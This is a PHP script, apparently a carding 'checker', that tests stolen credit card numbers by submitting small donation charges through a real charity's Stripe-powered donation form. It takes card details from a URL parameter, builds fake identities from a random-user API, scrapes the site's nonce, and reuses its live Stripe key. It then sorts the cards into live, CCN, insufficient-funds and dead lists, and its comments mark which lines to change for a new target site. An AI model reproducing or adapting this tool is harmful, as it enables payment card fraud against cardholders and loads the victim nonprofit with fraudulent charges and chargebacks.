<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

#----------------------------------------------------------------#
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#----------------------------------------------------------------#
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# ----------------- [ Nonce and Cookies ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://100menofshreveport.org/donate/'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$headers = array();
$headers[] ='Host: 100menofshreveport.org'; // ETO LANG PAPALITAN
$headers[] ='Connection: keep-alive';
$headers[] ='Cache-control: max-age=0';
$headers[] ='Upgrade-insecure-requests: 1';
$headers[] ='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=STRIPE;q=0.9';
$headers[] ='Sec-Fetch-Mode: navigate';
$headers[] ='Sec-Fetch-User: ?1';
$headers[] ='Sec-Fetch-Site: none';
$headers[] ='Accept-Language: en-US,en;q=0.9';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);
$result0 = curl_exec($ch);
$nonce = trim(strip_tags(getStr($result0,'name="_wpnonce" value="','"')));
$wp = trim(strip_tags(getStr($result0, 'windows.tdwGlobal = {"','}'), '"wpRestNonce":"','"'));
$formid = trim(strip_tags(getStr($result0,'name="simpay_form_id" value="','"')));;


# ----------------- [ 1st curl  ] ---------------------#

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[email]='.$name.'%40gmail.com&owner[address][postal_code]=10010&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2b876908-096c-4a9f-85e2-07c99ec3ed02be5808&muid=3df5742c-ba9b-4f20-81c2-27ac8fa22d68023fea&sid=fee1ef74-9269-4675-9a9c-b81ed780c4218a75fc&pasted_fields=number&payment_user_agent=stripe.js%2Fe3af8597%3B+stripe-js-v3%2Fe3af8597&time_on_page=96021&referrer=https%3A%2F%2F100menofshreveport.org%2F&key=pk_live_51H2mITHmP6DgBJ75xhGHNOXI2kg5yEFle1OqmSw7ligUEosncaYkuAhDJsUrHODR6woCG2cbWKpYoxw13vWvEvRY00PneJU3Ow'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: api.stripe.com';
//$headers[] ='x-requested-with: ';
//$headers[] ='x-wp-nonce: ';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://js.stripe.com'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://js.stripe.com/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch); //printing the result
$gorilla = json_decode($result1, true);
$token1 = $gorilla['id'];

// echo $result1;

# ----------------- [ 2nd curl ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://100menofshreveport.org/wp-json/wpsp/v2/customer'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_customer_name%5D='.$name.'+'.$last.'&form_values%5Bsimpay_email%5D='.$name.'%40gmail.com&form_values%5Bsimpay_custom_amount%5D=6.00&form_values%5Bsimpay_form_id%5D='.$formid.'&form_values%5Bsimpay_amount%5D=600&form_values%5B_wpnonce%5D='.$nonce.'&form_values%5B_wp_http_referer%5D=%2Fdonate%2F&form_data%5BformId%5D='.$formid.'&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51H2mITHmP6DgBJ75xhGHNOXI2kg5yEFle1OqmSw7ligUEosncaYkuAhDJsUrHODR6woCG2cbWKpYoxw13vWvEvRY00PneJU3Ow&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2F100menofshreveport.org%2Fpayment-confirmation%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2F100menofshreveport.org%2Fpayment-failed%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=600&form_data%5BisTestMode%5D=false&form_data%5BisSubscription%5D=false&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=5&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=5&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=0&form_data%5BplanIntervalCount%5D=0&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BstripeErrorMessages%5D%5Binvalid_number%5D=The+card+number+is+not+a+valid+credit+card+number.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_month%5D=The+cards+expiration+month+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year%5D=The+cards+expiration+year+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_cvc%5D=The+cards+security+code+is+invalid.&form_data%5BstripeErrorMessages%5D%5Bincorrect_number%5D=The+card+number+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincomplete_number%5D=The+card+number+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_cvc%5D=The+cards+security+code+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_expiry%5D=The+cards+expiration+date+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bexpired_card%5D=The+card+has+expired.&form_data%5BstripeErrorMessages%5D%5Bincorrect_cvc%5D=The+cards+security+code+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincorrect_zip%5D=The+cards+zip+code+failed+validation.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year_past%5D=The+cards+expiration+year+is+in+the+past&form_data%5BstripeErrorMessages%5D%5Bcard_declined%5D=The+card+was+declined.&form_data%5BstripeErrorMessages%5D%5Bprocessing_error%5D=An+error+occurred+while+processing+the+card.&form_data%5BstripeErrorMessages%5D%5Binvalid_request_error%5D=Unable+to+process+this+payment%2C+please+try+again+or+use+alternative+method.&form_data%5BstripeErrorMessages%5D%5Bemail_invalid%5D=Invalid+email+address%2C+please+correct+and+try+again.&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B5.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B0.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BcompanyName%5D=&form_data%5BsubscriptionType%5D=disabled&form_data%5BplanInterval%5D=0&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=embedded&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bnicename%5D=Credit+Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Binternal_docs%5D=&form_data%5BpaymentMethods%5D%5B0%5D%5Bexternal_docs%5D=https%3A%2F%2Fstripe.com%2Fpayments%2Fpayment-methods-guide%23cards&form_data%5BcustomAmount%5D=6&form_data%5BfinalAmount%5D=6.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BuseCustomPlan%5D=true&form_data%5BcustomPlanAmount%5D=0&form_id='.$formid.'&source_id='.$token1.''); //ETO LANG PAPALITAN'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: 100menofshreveport.org'; // eto lang papalitan
$headers[] ='x-requested-with: XMLHttpRequest';
$headers[] ='x-wp-nonce: '.$wp.'';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://100menofshreveport.org'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://100menofshreveport.org/donate/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

$result2 = curl_exec($ch);
$toks2 = json_decode($result2, true);
$token2 = $toks2['id'];

$mesg = trim(strip_tags(getstr($result2,'"message":"','","')));
$check = trim(strip_tags(getstr($result,',"cvc_check":"','",')));

echo $check;
  
# ---------------- [Responses] ----------------- #
if (strpos($result2, ',"cvc_check":"pass",')) {
  fwrite(fopen('CVV.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-success">Aprovada</span> </span> <span class="badge badge-warning">'.$lista.'</span> <span class="badge badge-success"><b><i>2nd req: pass<b></i> [] <b><i>3rd req: '.$check2.''.$message.'</b></i>CVV‌ </span> </span><br> ';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">Aprovada</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">CCN</span><br>';
}
elseif (strpos($result2, "The card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">Aprovada</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">CCN‌</span><br>';
}
elseif (strpos($result2, ',"cvc_check":"fail",')) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">Aprovada</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">CCN‌</span><br>';
}
elseif(strpos($result2, 'Your card has insufficient funds.')) {
  fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">Aprovada</span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-success"> '.$mesg.' | CVV‌</span> </span> <br>';
}
elseif (strpos($result2, "Invalid source object: must be a dictionary or a non-empty string.")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>GENERIC PHARMACY| DIE</span><br> ';
}
elseif (strpos($result2, ',"cvc_check":"unavailable",')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>unavailable | DIE</span> ';
}
 else {
  fwrite(fopen('dead.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>'.$cvvcheck.''.$mesg.'  Die‌ </span><br> ';
}
  curl_close($curl);
  ob_flush();
 
//echo $result2;
?>


